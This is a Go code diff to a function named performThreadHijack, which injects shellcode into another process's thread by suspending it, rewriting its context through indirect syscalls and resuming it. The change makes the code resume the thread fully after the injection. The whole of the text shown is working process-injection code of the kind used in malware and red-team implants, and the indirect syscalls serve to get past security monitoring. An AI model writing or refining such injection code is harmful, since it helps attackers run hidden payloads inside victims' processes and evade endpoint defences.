@@ -161,7 +161,8 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	if int32(prevCount) == -1 {
 		return sb.String(), fmt.Errorf("SuspendThread failed: %w", err)
 	}
-	sb.WriteString(fmt.Sprintf("[+] Thread suspended (previous suspend count: %d)\n", prevCount))
+	priorSuspendCount := uint32(prevCount)
+	sb.WriteString(fmt.Sprintf("[+] Thread suspended (previous suspend count: %d)\n", priorSuspendCount))
 
 	// Step 6: Get thread context
 	var ctx CONTEXT_AMD64
@@ -169,7 +170,6 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	if IndirectSyscallsAvailable() {
 		status := IndirectNtGetContextThread(hThread, uintptr(unsafe.Pointer(&ctx)))
 		if status != 0 {
-			// Resume thread before returning on error
 			resumeThread(&sb, hThread)
 			return sb.String(), fmt.Errorf("thread context read failed: status 0x%X", status)
 		}
@@ -203,8 +203,11 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	}
 	sb.WriteString("[+] Thread context updated\n")
 
-	// Step 9: Resume thread
+	// Step 9: Resume thread — must fully unsuspend (account for pre-existing suspend count)
 	resumeThread(&sb, hThread)
+	for i := uint32(0); i < priorSuspendCount; i++ {
+		resumeThread(&sb, hThread)
+	}
 
 	sb.WriteString("[+] Thread hijack injection completed successfully\n")
 	return sb.String(), nil
